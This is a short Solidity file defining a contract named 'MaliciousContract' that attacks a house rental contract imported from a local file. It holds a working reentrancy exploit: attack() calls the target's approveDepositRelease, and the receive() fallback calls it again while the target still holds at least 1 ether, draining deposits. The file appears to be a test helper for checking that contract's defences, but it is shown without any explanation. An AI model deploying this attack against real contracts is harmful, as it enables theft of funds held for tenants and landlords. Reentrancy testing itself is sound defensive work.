// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./UpdatedRentalContract.sol";

contract MaliciousContract {
    HouseRentalContract public target;
    bytes6 public targetContractId;
    uint public targetRequestIndex;

    constructor(address _targetAddress, bytes6 _targetContractId, uint _targetRequestIndex) {
        target = HouseRentalContract(_targetAddress);
        targetContractId = _targetContractId;
        targetRequestIndex = _targetRequestIndex;
    }

    function attack() external payable {
        target.approveDepositRelease(targetContractId, targetRequestIndex);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.approveDepositRelease(targetContractId, targetRequestIndex);
        }
    }
}
